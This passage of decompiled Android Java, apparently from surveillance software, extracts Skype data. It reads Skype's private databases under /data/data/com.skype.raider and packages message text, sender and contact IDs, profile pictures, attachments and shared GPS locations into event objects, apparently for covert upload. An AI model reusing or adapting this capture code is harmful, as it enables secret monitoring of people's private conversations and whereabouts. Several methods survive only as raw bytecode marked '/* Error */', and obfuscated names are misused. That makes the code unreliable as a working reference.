    ((HashSet)localObject3).<init>();
    localObject1 = paramc.d();
    Object localObject4 = ((List)localObject1).iterator();
    Object localObject6;
    for (;;)
    {
      bool1 = ((Iterator)localObject4).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject4).next();
      localObject5 = ((com.vvt.im.events.info.e)localObject1).d();
      localObject6 = paramc.e().b();
      boolean bool4 = ((String)localObject5).equalsIgnoreCase((String)localObject6);
      if (!bool4)
      {
        localObject1 = ((com.vvt.im.events.info.e)localObject1).d();
        ((HashSet)localObject3).add(localObject1);
      }
    }
    localObject1 = paramc.g().a();
    localObject4 = paramc.e().b();
    boolean bool1 = ((String)localObject1).equalsIgnoreCase((String)localObject4);
    if (!bool1)
    {
      localObject1 = paramc.g().a();
      ((HashSet)localObject3).add(localObject1);
    }
    ((FxIMConversationEvent)localObject2).setParticipantContactIds((HashSet)localObject3);
    localArrayList.add(localObject2);
    localObject1 = paramc.d();
    localObject2 = ((List)localObject1).iterator();
    for (;;)
    {
      bool1 = ((Iterator)localObject2).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject2).next();
      localObject3 = ((com.vvt.im.events.info.e)localObject1).d();
      localObject4 = paramc.e().b();
      boolean bool5 = ((String)localObject3).equalsIgnoreCase((String)localObject4);
      if (!bool5)
      {
        localObject3 = new com/vvt/events/FxIMContactEvent;
        ((FxIMContactEvent)localObject3).<init>();
        localObject4 = ((com.vvt.im.events.info.e)localObject1).c();
        ((FxIMContactEvent)localObject3).setContactDisplayName((String)localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).d();
        ((FxIMContactEvent)localObject3).setContactId((String)localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).e();
        ((FxIMContactEvent)localObject3).setContactProfilePicture((byte[])localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).a();
        ((FxIMContactEvent)localObject3).setContactProfilePicturePath((String)localObject4);
        localObject1 = ((com.vvt.im.events.info.e)localObject1).f();
        ((FxIMContactEvent)localObject3).setContactStatusMessage((String)localObject1);
        long l2 = paramc.h();
        ((FxIMContactEvent)localObject3).setEventTime(l2);
        int k = FxIMMessageServiceType.SKYPE.getValue();
        ((FxIMContactEvent)localObject3).setImServiceId(k);
        localObject1 = paramc.e().b();
        ((FxIMContactEvent)localObject3).setOwnerId((String)localObject1);
        localArrayList.add(localObject3);
      }
    }
    localObject3 = new com/vvt/events/FxIMMessageEvent;
    ((FxIMMessageEvent)localObject3).<init>();
    localObject4 = new java/util/ArrayList;
    ((ArrayList)localObject4).<init>();
    localObject1 = paramc.c();
    localObject2 = ((List)localObject1).iterator();
    for (;;)
    {
      bool2 = ((Iterator)localObject2).hasNext();
      if (!bool2) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.a)((Iterator)localObject2).next();
      localObject5 = new com/vvt/events/d;
      ((com.vvt.events.d)localObject5).<init>();
      localObject6 = ((com.vvt.im.events.info.a)localObject1).e();
      ((com.vvt.events.d)localObject5).b((byte[])localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).a();
      ((com.vvt.events.d)localObject5).a((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).c();
      ((com.vvt.events.d)localObject5).b((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).b();
      ((com.vvt.events.d)localObject5).c((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).f();
      ((com.vvt.events.d)localObject5).d((String)localObject6);
      localObject1 = ((com.vvt.im.events.info.a)localObject1).d();
      ((com.vvt.events.d)localObject5).a((byte[])localObject1);
      ((List)localObject4).add(localObject5);
    }
    boolean bool2 = false;
    localObject1 = null;
    i = paramc.a();
    int n = MessageType.ShareLocation.getNumber();
    i &= n;
    Object localObject5 = MessageType.ShareLocation;
    n = ((MessageType)localObject5).getNumber();
    if (i == n)
    {
      localObject1 = new com/vvt/events/e;
      ((com.vvt.events.e)localObject1).<init>();
      float f = paramc.f().d();
      ((com.vvt.events.e)localObject1).a(f);
      double d1 = paramc.f().a();
      ((com.vvt.events.e)localObject1).a(d1);
      d1 = paramc.f().b();
      ((com.vvt.events.e)localObject1).b(d1);
      localObject2 = paramc.f().c();
      ((com.vvt.events.e)localObject1).a((String)localObject2);
    }
    localObject2 = paramc.j().a();
    ((FxIMMessageEvent)localObject3).setConversationId((String)localObject2);
    localObject2 = paramc.i();
    localObject5 = ICallLogData.Direction.IN;
    if (localObject2 == localObject5) {}
    for (localObject2 = FxEventDirection.IN;; localObject2 = FxEventDirection.OUT)
    {
      ((FxIMMessageEvent)localObject3).setDirection((FxEventDirection)localObject2);
      long l3 = paramc.h();
      ((FxIMMessageEvent)localObject3).setEventTime(l3);
      i = FxIMMessageServiceType.SKYPE.getValue();
      ((FxIMMessageEvent)localObject3).setImServiceId(i);
      localObject2 = paramc.b();
      ((FxIMMessageEvent)localObject3).setMessage((String)localObject2);
      localObject2 = new com/vvt/events/e;
      ((com.vvt.events.e)localObject2).<init>();
      ((FxIMMessageEvent)localObject3).setMessageLocation((com.vvt.events.e)localObject2);
      ((FxIMMessageEvent)localObject3).setShareLocation((com.vvt.events.e)localObject1);
      int m = paramc.a();
      ((FxIMMessageEvent)localObject3).setTextRepresentation(m);
      localObject1 = paramc.i();
      localObject2 = ICallLogData.Direction.IN;
      if (localObject1 == localObject2)
      {
        localObject1 = paramc.g().a();
        ((FxIMMessageEvent)localObject3).setSenderId((String)localObject1);
      }
      localObject2 = ((List)localObject4).iterator();
      for (;;)
      {
        boolean bool3 = ((Iterator)localObject2).hasNext();
        if (!bool3) {
          break;
        }
        localObject1 = (com.vvt.events.d)((Iterator)localObject2).next();
        ((FxIMMessageEvent)localObject3).addAttachment((com.vvt.events.d)localObject1);
      }
    }
    localArrayList.add(localObject3);
    return localArrayList;
  }
  
  private static void a(SQLiteDatabase paramSQLiteDatabase1, SQLiteDatabase paramSQLiteDatabase2, String paramString1, com.vvt.capture.e.a.c paramc, int paramInt, String paramString2, boolean paramBoolean, String paramString3, String paramString4, String paramString5)
  {
    boolean bool1 = a;
    int j;
    if ((!bool1) || (paramString2 != null))
    {
      int i = paramString2.length();
      j = 1;
      if (i >= j) {}
    }
    else
    {
      bool2 = a;
      if (bool2) {}
      localObject1 = "body_xml";
      j = 1;
      paramString2 = a(paramSQLiteDatabase1, paramInt, (String)localObject1, j);
    }
    boolean bool2 = com.vvt.ag.b.a(paramString2);
    boolean bool3;
    Object localObject2;
    Object localObject3;
    if (!bool2)
    {
      localObject1 = g.b(paramString2);
      bool3 = a;
      if (bool3) {}
      bool3 = a;
      if ((!bool3) || (paramSQLiteDatabase2 != null))
      {
        localObject2 = new java/lang/StringBuilder;
        ((StringBuilder)localObject2).<init>();
        localObject3 = "u";
        localObject2 = ((StringBuilder)localObject2).append((String)localObject3);
        localObject1 = (String)localObject1;
        localObject1 = a(paramSQLiteDatabase2, (String)localObject1, paramBoolean);
        if (paramString5 != null)
        {
          localObject2 = "live";
          bool3 = paramString5.startsWith((String)localObject2);
          if (bool3)
          {
            localObject2 = paramString5.replace("live:", "");
            localObject3 = new java/lang/StringBuilder;
            ((StringBuilder)localObject3).<init>();
            str1 = "live#3a";
            localObject3 = ((StringBuilder)localObject3).append(str1);
            localObject2 = ((StringBuilder)localObject3).append((String)localObject2);
            paramString5 = ((StringBuilder)localObject2).toString();
          }
        }
        bool3 = a;
        if (bool3) {}
        String str1 = p.a("/data/data/com.skype.raider/files", paramString5);
        localObject2 = "";
        localObject3 = "";
        Iterator localIterator = ((ArrayList)localObject1).iterator();
        do
        {
          bool2 = localIterator.hasNext();
          if (!bool2) {
            break;
          }
          localObject1 = (a)localIterator.next();
          boolean bool4 = true;
          Object localObject4 = new Object[bool4];
          String str2 = ((a)localObject1).a;
          localObject4[0] = str2;
          localObject2 = String.format("*%s*", (Object[])localObject4);
          long l = ((a)localObject1).b;
          boolean bool5 = a;
          if (bool5) {}
          localObject2 = g.a(paramString3, str1, (String)localObject2, l);
          bool4 = a;
          if (bool4) {}
          localObject1 = ((a)localObject1).a;
          localObject4 = "pthumbnail";
          bool2 = ((String)localObject1).startsWith((String)localObject4);
        } while (!bool2);
      }
    }
    for (Object localObject1 = localObject2;; localObject1 = localObject3)
    {
      bool3 = a;
      if (bool3) {}
      bool3 = com.vvt.ag.b.a((String)localObject1);
      if (!bool3)
      {
        localObject2 = ImType.SKYPE;
        localObject3 = ImMediaFileType.THUMBMAIL;
        localObject1 = g.a(paramString1, (String)localObject1, (ImType)localObject2, (ImMediaFileType)localObject3, paramString4);
        localObject2 = new java/util/ArrayList;
        ((ArrayList)localObject2).<init>();
        localObject3 = new com/vvt/im/events/info/a;
        ((com.vvt.im.events.info.a)localObject3).<init>();
        ((com.vvt.im.events.info.a)localObject3).d((String)localObject1);
        localObject1 = "image/png";
        ((com.vvt.im.events.info.a)localObject3).b((String)localObject1);
        ((ArrayList)localObject2).add(localObject3);
        paramc.a((List)localObject2);
      }
      bool2 = a;
      if (bool2) {}
      return;
    }
  }
  
  private static void a(SQLiteDatabase paramSQLiteDatabase, String paramString1, com.vvt.capture.e.a.c paramc, String paramString2)
  {
    int i = 2;
    int j = 1;
    Double localDouble = null;
    boolean bool1 = a;
    if (bool1) {}
    int k = 3;
    Object localObject = new String[k];
    localObject[0] = "latitude";
    localObject[j] = "longitude";
    String str = "address";
    localObject[i] = str;
    localObject = g.a(paramString2, (String[])localObject);
    boolean bool2;
    if (localObject != null)
    {
      float f = 1000000.0F;
      com.vvt.im.events.info.c localc = new com/vvt/im/events/info/c;
      localc.<init>();
      double d1 = Double.valueOf(localObject[0]).doubleValue();
      double d2 = f;
      d1 /= d2;
      localc.a(d1);
      localDouble = Double.valueOf(localObject[j]);
      d1 = localDouble.doubleValue();
      d2 = f;
      d1 /= d2;
      localc.b(d1);
      localObject = localObject[i];
      localc.a((String)localObject);
      paramc.a(localc);
      bool2 = a;
      if (!bool2) {}
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return;
      bool2 = c;
      if (!bool2) {}
    }
  }
  
  private static boolean a(int paramInt, com.vvt.base.b paramb, long paramLong)
  {
    boolean bool1 = false;
    boolean bool2 = true;
    long l = 0L;
    boolean bool3 = paramLong < l;
    if (!bool3) {
      bool2 = false;
    }
    int i = 7;
    if (paramInt == i)
    {
      l = paramb.b();
      boolean bool4 = paramLong < l;
      if (!bool4) {
        break label183;
      }
      bool2 = d;
      if (!bool2) {}
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return bool1;
      int j = 70;
      if (paramInt == j)
      {
        l = paramb.c();
        boolean bool5 = paramLong < l;
        if (bool5)
        {
          bool2 = d;
          if (!bool2) {
            continue;
          }
        }
      }
      else
      {
        int k = 99;
        boolean bool6;
        if (paramInt == k)
        {
          l = paramb.b();
          bool6 = paramLong < l;
          if (bool6)
          {
            bool2 = d;
            if (!bool2) {
              continue;
            }
          }
        }
        else
        {
          l = paramb.e();
          bool6 = paramLong < l;
          if (bool6)
          {
            bool2 = d;
            if (!bool2) {
              continue;
            }
            continue;
          }
        }
      }
      label183:
      bool1 = bool2;
    }
  }
  
  public static String[] a()
  {
    int i = 2;
    int j = 1;
    String[] arrayOfString = new String[i];
    Object[] arrayOfObject = new Object[i];
    arrayOfObject[0] = "/data/data";
    arrayOfObject[j] = "com.skype.raider";
    String str = String.format("%s/%s", arrayOfObject);
    arrayOfString[0] = str;
    arrayOfObject = new Object[i];
    arrayOfObject[0] = "/dbdata/databases";
    arrayOfObject[j] = "com.skype.raider";
    str = String.format("%s/%s", arrayOfObject);
    arrayOfString[j] = str;
    return arrayOfString;
  }
  
  /* Error */
  private static long b(SQLiteDatabase paramSQLiteDatabase, String paramString, boolean paramBoolean)
  {
    // Byte code:
    //   0: getstatic 17	com/vvt/capture/e/d:a	Z
    //   3: istore_3
    //   4: iload_3
    //   5: ifeq +3 -> 8
    //   8: lconst_0
    //   9: lstore 4
    //   11: iconst_0
    //   12: istore 6
    //   14: iconst_1
    //   15: istore 7
    //   17: iload 7
    //   19: anewarray 4	java/lang/Object
    //   22: astore 8
    //   24: iconst_0
    //   25: istore 9
    //   27: aconst_null
    //   28: astore 10
    //   30: aload 8
    //   32: iconst_0
    //   33: ldc_w 526
    //   36: aastore
    //   37: ldc_w 457
    //   40: aload 8
    //   42: invokestatic 267	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   45: astore 11
    //   47: iconst_1
    //   48: anewarray 182	java/lang/String
    //   51: astore 12
    //   53: iconst_0
    //   54: istore_3
    //   55: aconst_null
    //   56: astore 13
    //   58: aload 12
    //   60: iconst_0
    //   61: aload_1
    //   62: aastore
    //   63: lconst_0
    //   64: lstore 14
    //   66: lload 4
    //   68: lload 14
    //   70: lcmp
    //   71: istore_3
    //   72: iload_3
    //   73: ifne +93 -> 166
    //   76: bipush 10
    //   78: istore_3
    //   79: iload 6
    //   81: iload_3
    //   82: if_icmpge +84 -> 166
    //   85: aconst_null
    //   86: astore 16
    //   88: aload_0
    //   89: ifnull +136 -> 225
    //   92: ldc_w 518
    //   95: astore 8
    //   97: iconst_0
    //   98: istore 9
    //   100: aconst_null
    //   101: astore 10
    //   103: iconst_0
    //   104: istore 17
    //   106: aload_0
    //   107: astore 13
    //   109: aload_0
    //   110: aload 8
    //   112: aconst_null
    //   113: aload 11
    //   115: aload 12
    //   117: aconst_null
    //   118: aconst_null
    //   119: aconst_null
    //   120: invokevirtual 465	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   123: astore 13
    //   125: aload 13
    //   127: ifnull +17 -> 144
    //   130: aload 13
    //   132: invokeinterface 521 1 0
    //   137: istore 7
    //   139: iload 7
    //   141: ifgt +40 -> 181
    //   144: getstatic 17	com/vvt/capture/e/d:a	Z
    //   147: istore 7
    //   149: iload 7
    //   151: ifeq +3 -> 154
    //   154: aload 13
    //   156: ifnull +10 -> 166
    //   159: aload 13
    //   161: invokeinterface 66 1 0
    //   166: getstatic 17	com/vvt/capture/e/d:a	Z
    //   169: istore_3
    //   170: iload_3
    //   171: ifeq +3 -> 174
    //   174: lload 4
    //   176: lstore 14
    //   178: lload 14
    //   180: lreturn
    //   181: aload 13
    //   183: invokeinterface 53 1 0
    //   188: istore 7
    //   190: iload 7
    //   192: ifeq +232 -> 424
    //   195: ldc_w 823
    //   198: astore 8
    //   200: aload 13
    //   202: aload 8
    //   204: invokeinterface 59 2 0
    //   209: istore 7
    //   211: aload 13
    //   213: iload 7
    //   215: invokeinterface 63 2 0
    //   220: lstore 4
    //   222: goto -41 -> 181
    //   225: getstatic 17	com/vvt/capture/e/d:a	Z
    //   228: istore_3
    //   229: iload_3
    //   230: ifeq +3 -> 233
    //   233: lload 4
    //   235: lstore 14
    //   237: aload 16
    //   239: ifnull +10 -> 249
    //   242: aload 16
    //   244: invokeinterface 66 1 0
    //   249: getstatic 17	com/vvt/capture/e/d:a	Z
    //   252: istore 9
    //   254: iload 9
    //   256: ifeq +3 -> 259
    //   259: iload_2
    //   260: ifeq +70 -> 330
    //   263: getstatic 17	com/vvt/capture/e/d:a	Z
    //   266: istore 9
    //   268: iload 9
    //   270: ifeq -92 -> 178
    //   273: goto -95 -> 178
    //   276: astore 13
    //   278: iconst_0
    //   279: istore 9
    //   281: aconst_null
    //   282: astore 10
    //   284: lload 4
    //   286: lstore 14
    //   288: getstatic 24	com/vvt/capture/e/d:MyUncaughtExceptionHandler	Z
    //   291: istore 17
    //   293: iload 17
    //   295: ifeq +3 -> 298
    //   298: aload 10
    //   300: ifnull -51 -> 249
    //   303: aload 10
    //   305: invokeinterface 66 1 0
    //   310: goto -61 -> 249
    //   313: astore 13
    //   315: aload 16
    //   317: ifnull +10 -> 327
    //   320: aload 16
    //   322: invokeinterface 66 1 0
    //   327: aload 13
    //   329: athrow
    //   330: lconst_0
    //   331: lstore 18
    //   333: lload 14
    //   335: lload 18
    //   337: lcmp
    //   338: istore 9
    //   340: iload 9
    //   342: ifgt +75 -> 417
    //   345: getstatic 17	com/vvt/capture/e/d:a	Z
    //   348: istore 9
    //   350: iload 9
    //   352: ifeq +3 -> 355
    //   355: ldc2_w 198
    //   358: lstore 18
    //   360: lload 18
    //   362: invokestatic 100	android/os/SystemClock:sleep	(J)V
    //   365: iload 6
    //   367: iconst_1
    //   368: iadd
    //   369: istore 9
    //   371: iload 9
    //   373: istore 6
    //   375: lload 14
    //   377: lstore 4
    //   379: goto -316 -> 63
    //   382: astore 8
    //   384: aload 13
    //   386: astore 16
    //   388: aload 8
    //   390: astore 13
    //   392: goto -77 -> 315
    //   395: astore 13
    //   397: aload 10
    //   399: astore 16
    //   401: goto -86 -> 315
    //   404: astore 8
    //   406: aload 13
    //   408: astore 10
    //   410: lload 4
    //   412: lstore 14
    //   414: goto -126 -> 288
    //   417: iload 6
    //   419: istore 9
    //   421: goto -50 -> 371
    //   424: aload 13
    //   426: astore 16
    //   428: lload 4
    //   430: lstore 14
    //   432: goto -195 -> 237
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	435	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	435	1	paramString	String
    //   0	435	2	paramBoolean	boolean
    //   3	70	3	bool1	boolean
    //   78	5	3	i	int
    //   169	61	3	bool2	boolean
    //   9	420	4	l1	long
    //   12	406	6	j	int
    //   15	125	7	k	int
    //   147	44	7	bool3	boolean
    //   209	5	7	m	int
    //   22	181	8	localObject1	Object
    //   382	7	8	localObject2	Object
    //   404	1	8	localException1	Exception
    //   25	326	9	bool4	boolean
    //   369	51	9	n	int
    //   28	381	10	localObject3	Object
    //   45	69	11	str	String
    //   51	65	12	arrayOfString	String[]
    //   56	156	13	localObject4	Object
    //   276	1	13	localException2	Exception
    //   313	72	13	localObject5	Object
    //   390	1	13	localObject6	Object
    //   395	30	13	localObject7	Object
    //   64	367	14	l2	long
    //   86	341	16	localObject8	Object
    //   104	190	17	bool5	boolean
    //   331	30	18	l3	long
    // Exception table:
    //   from	to	target	type
    //   119	123	276	java/lang/Exception
    //   225	228	276	java/lang/Exception
    //   119	123	313	finally
    //   225	228	313	finally
    //   130	137	382	finally
    //   144	147	382	finally
    //   181	188	382	finally
    //   202	209	382	finally
    //   213	220	382	finally
    //   288	291	395	finally
    //   130	137	404	java/lang/Exception
    //   144	147	404	java/lang/Exception
    //   181	188	404	java/lang/Exception
    //   202	209	404	java/lang/Exception
    //   213	220	404	java/lang/Exception
  }
  
  /* Error */
  public static long b(String paramString)
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore_1
    //   3: iconst_0
    //   4: istore_3
    //   5: aconst_null
    //   6: astore 4
    //   8: ldc_w 587
    //   11: astore 5
    //   13: aload 5
    //   15: aload_0
    //   16: invokestatic 592	com/vvt/capture/e/removeFromPath/a/a:a	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   19: astore 6
    //   21: aload 6
    //   23: ifnull +33 -> 56
    //   26: aload 6
    //   28: invokestatic 77	com/vvt/capture/e/d:a	(Landroid/database/sqlite/SQLiteDatabase;)J
    //   31: lstore 7
    //   33: getstatic 17	com/vvt/capture/e/d:a	Z
    //   36: istore 9
    //   38: iload 9
    //   40: ifeq +3 -> 43
    //   43: aload 6
    //   45: ifnull +8 -> 53
    //   48: aload 6
    //   50: invokevirtual 78	android/database/sqlite/SQLiteDatabase:close	()V
    //   53: lload 7
    //   55: lreturn
    //   56: getstatic 17	com/vvt/capture/e/d:a	Z
    //   59: istore_3
    //   60: iload_3
    //   61: ifeq +3 -> 64
    //   64: lload_1
    //   65: lstore 7
    //   67: goto -34 -> 33
    //   70: astore 5
    //   72: aconst_null
    //   73: astore 6
    //   75: lload_1
    //   76: lstore 7
    //   78: getstatic 24	com/vvt/capture/e/d:MyUncaughtExceptionHandler	Z
    //   81: istore 9
    //   83: iload 9
    //   85: ifeq +3 -> 88
    //   88: aload 6
    //   90: ifnull -37 -> 53
    //   93: goto -45 -> 48
    //   96: astore 5
    //   98: aconst_null
    //   99: astore 6
    //   101: aload 5
    //   103: astore 4
    //   105: aload 6
    //   107: ifnull +8 -> 115
    //   110: aload 6
    //   112: invokevirtual 78	android/database/sqlite/SQLiteDatabase:close	()V
    //   115: aload 4
    //   117: athrow
    //   118: astore 4
    //   120: goto -15 -> 105
    //   123: astore 4
    //   125: lload_1
    //   126: lstore 7
    //   128: goto -50 -> 78
    //   131: pop
    //   132: goto -54 -> 78
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	135	0	paramString	String
    //   2	124	1	l1	long
    //   4	57	3	bool1	boolean
    //   6	110	4	localObject1	Object
    //   118	1	4	localObject2	Object
    //   123	1	4	localException1	Exception
    //   11	3	5	str	String
    //   70	1	5	localException2	Exception
    //   96	6	5	localObject3	Object
    //   19	92	6	localSQLiteDatabase	SQLiteDatabase
    //   31	96	7	l2	long
    //   36	48	9	bool2	boolean
    //   131	1	12	localException3	Exception
    // Exception table:
    //   from	to	target	type
    //   15	19	70	java/lang/Exception
    //   15	19	96	finally
    //   26	31	118	finally
    //   33	36	118	finally
    //   56	59	118	finally
    //   78	81	118	finally
    //   26	31	123	java/lang/Exception
    //   56	59	123	java/lang/Exception
    //   33	36	131	java/lang/Exception
  }
  
  /* Error */
  private static com.vvt.capture.e.a.d b(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_2
    //   2: aconst_null
    //   3: astore_3
    //   4: invokestatic 1098	com/vvt/capture/e/d:FxFileObserverWorker	()Ljava/lang/String;
    //   7: astore 4
    //   9: iconst_1
    //   10: istore 5
    //   12: iload 5
    //   14: anewarray 182	java/lang/String
    //   17: astore 6
    //   19: aload 6
    //   21: iconst_0
    //   22: aload_1
    //   23: aastore
    //   24: aload_0
    //   25: aload 4
    //   27: aload 6
    //   29: invokevirtual 383	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   32: astore 6
    //   34: aload 6
    //   36: ifnull +214 -> 250
    //   39: aload 6
    //   41: invokeinterface 53 1 0
    //   46: istore 7
    //   48: iload 7
    //   50: ifeq +200 -> 250
    //   53: new 86	com/vvt/capture/e/a/d
    //   56: astore 4
    //   58: aload 4
    //   60: invokespecial 1099	com/vvt/capture/e/a/d:<init>	()V
    //   63: ldc_w 1101
    //   66: astore_3
    //   67: aload 6
    //   69: aload_3
    //   70: invokeinterface 59 2 0
    //   75: istore_2
    //   76: aload 6
    //   78: iload_2
    //   79: invokeinterface 389 2 0
    //   84: astore_3
    //   85: aload 4
    //   87: aload_3
    //   88: invokevirtual 1102	com/vvt/capture/e/a/d:removeFromPath	(Ljava/lang/String;)V
    //   91: ldc_w 1104
    //   94: astore_3
    //   95: aload 6
    //   97: aload_3
    //   98: invokeinterface 59 2 0
    //   103: istore_2
    //   104: aload 6
    //   106: iload_2
    //   107: invokeinterface 389 2 0
    //   112: astore_3
    //   113: aload 4
    //   115: aload_3
    //   116: invokevirtual 1105	com/vvt/capture/e/a/d:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   119: ldc_w 1107
    //   122: astore_3
    //   123: aload 6
    //   125: aload_3
    //   126: invokeinterface 59 2 0
    //   131: istore_2
    //   132: aload 6
    //   134: iload_2
    //   135: invokeinterface 389 2 0
    //   140: astore_3
    //   141: aload 4
    //   143: aload_3
    //   144: invokevirtual 1108	com/vvt/capture/e/a/d:d	(Ljava/lang/String;)V
    //   147: aload 6
    //   149: ifnull +10 -> 159
    //   152: aload 6
    //   154: invokeinterface 66 1 0
    //   159: aload 4
    //   161: areturn
    //   162: astore 4
    //   164: iconst_0
    //   165: istore 7
    //   167: aconst_null
    //   168: astore 4
    //   170: getstatic 24	com/vvt/capture/e/d:MyUncaughtExceptionHandler	Z
    //   173: istore 5
    //   175: iload 5
    //   177: ifeq +3 -> 180
    //   180: aload_3
    //   181: ifnull -22 -> 159
    //   184: aload_3
    //   185: invokeinterface 66 1 0
    //   190: goto -31 -> 159
    //   193: astore 4
    //   195: iconst_0
    //   196: istore 5
    //   198: aconst_null
    //   199: astore 6
    //   201: aload 6
    //   203: ifnull +10 -> 213
    //   206: aload 6
    //   208: invokeinterface 66 1 0
    //   213: aload 4
    //   215: athrow
    //   216: astore 4
    //   218: goto -17 -> 201
    //   221: astore 4
    //   223: aload_3
    //   224: astore 6
    //   226: goto -25 -> 201
    //   229: astore 4
    //   231: iconst_0
    //   232: istore 7
    //   234: aconst_null
    //   235: astore 4
    //   237: aload 6
    //   239: astore_3
    //   240: goto -70 -> 170
    //   243: astore_3
    //   244: aload 6
    //   246: astore_3
    //   247: goto -77 -> 170
    //   250: iconst_0
    //   251: istore 7
    //   253: aconst_null
    //   254: astore 4
    //   256: goto -109 -> 147
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	259	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	259	1	paramString	String
    //   1	134	2	i	int
    //   3	237	3	localObject1	Object
    //   243	1	3	localException1	Exception
    //   246	1	3	localObject2	Object
    //   7	153	4	localObject3	Object
    //   162	1	4	localException2	Exception
    //   168	1	4	localObject4	Object
    //   193	21	4	localObject5	Object
    //   216	1	4	localObject6	Object
    //   221	1	4	localObject7	Object
    //   229	1	4	localException3	Exception
    //   235	20	4	localObject8	Object
    //   10	187	5	bool1	boolean
    //   17	228	6	localObject9	Object
    //   46	206	7	bool2	boolean
    // Exception table:
    //   from	to	target	type
    //   4	7	162	java/lang/Exception
    //   12	17	162	java/lang/Exception
    //   22	24	162	java/lang/Exception
    //   27	32	162	java/lang/Exception
    //   4	7	193	finally
    //   12	17	193	finally
    //   22	24	193	finally
    //   27	32	193	finally
    //   39	46	216	finally
    //   53	56	216	finally
    //   58	63	216	finally
    //   69	75	216	finally
    //   78	84	216	finally
    //   87	91	216	finally
    //   97	103	216	finally
    //   106	112	216	finally
    //   115	119	216	finally
    //   125	131	216	finally
    //   134	140	216	finally
    //   143	147	216	finally
    //   170	173	221	finally
    //   39	46	229	java/lang/Exception
    //   53	56	229	java/lang/Exception
    //   58	63	229	java/lang/Exception
    //   69	75	243	java/lang/Exception
    //   78	84	243	java/lang/Exception
    //   87	91	243	java/lang/Exception
    //   97	103	243	java/lang/Exception
    //   106	112	243	java/lang/Exception
    //   115	119	243	java/lang/Exception
    //   125	131	243	java/lang/Exception
    //   134	140	243	java/lang/Exception
    //   143	147	243	java/lang/Exception
  }
  
  /* Error */
  private static com.vvt.capture.e.a.d b(SQLiteDatabase paramSQLiteDatabase, String paramString1, String paramString2)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_3
    //   2: new 125	java/lang/StringBuilder
    //   5: astore 4
    //   7: aload 4
    //   9: invokespecial 126	java/lang/StringBuilder:<init>	()V
    //   12: ldc_w 1110
    //   15: astore 5
    //   17: aload 4
    //   19: aload 5
    //   21: invokevirtual 130	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   24: astore 4
    //   26: aload 4
    //   28: aload_1
    //   29: invokevirtual 130	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   32: astore 4
    //   34: ldc_w 1112
    //   37: astore 5
    //   39: aload 4
    //   41: aload 5
    //   43: invokevirtual 130	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   46: astore 4
    //   48: aload 4
    //   50: invokevirtual 139	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   53: astore 4
    //   55: iconst_1
    //   56: istore 6
    //   58: iload 6
    //   60: anewarray 182	java/lang/String
    //   63: astore 5
    //   65: iconst_0
    //   66: istore 7
    //   68: aconst_null
    //   69: astore 8
    //   71: aload 5
    //   73: iconst_0
    //   74: aload_2
    //   75: aastore
    //   76: aload_0
    //   77: aload 4
    //   79: aload 5
    //   81: invokevirtual 383	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   84: astore 5
    //   86: aload 5
    //   88: ifnull +155 -> 243
    //   91: aload 5
    //   93: invokeinterface 53 1 0
    //   98: istore 9
    //   100: iload 9
    //   102: ifeq +141 -> 243
    //   105: ldc_w 1114
    //   108: astore 4
    //   110: aload 5
    //   112: aload 4
    //   114: invokeinterface 59 2 0
    //   119: istore 9
    //   121: aload 5
    //   123: iload 9
    //   125: invokeinterface 389 2 0
    //   130: astore 4
    //   132: ldc_w 1104
    //   135: astore 8
    //   137: aload 5
    //   139: aload 8
    //   141: invokeinterface 59 2 0
    //   146: istore 7
    //   148: aload 5
    //   150: iload 7
    //   152: invokeinterface 389 2 0
    //   157: astore 10
    //   159: ldc_w 1107
    //   162: astore 8
    //   164: aload 5
    //   166: aload 8
    //   168: invokeinterface 59 2 0
    //   173: istore 7
    //   175: aload 5
    //   177: iload 7
    //   179: invokeinterface 389 2 0
    //   184: astore 11
    //   186: aload 4
    //   188: invokestatic 144	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   191: istore 7
    //   193: iload 7
    //   195: ifne +152 -> 347
    //   198: aload 4
    //   200: invokestatic 351	com/vvt/io/d:AppEngine1	(Ljava/lang/String;)Ljava/lang/String;
    //   203: astore 4
    //   205: aload 4
    //   207: astore 8
    //   209: new 86	com/vvt/capture/e/a/d
    //   212: astore 4
    //   214: aload 4
    //   216: invokespecial 1099	com/vvt/capture/e/a/d:<init>	()V
    //   219: aload 4
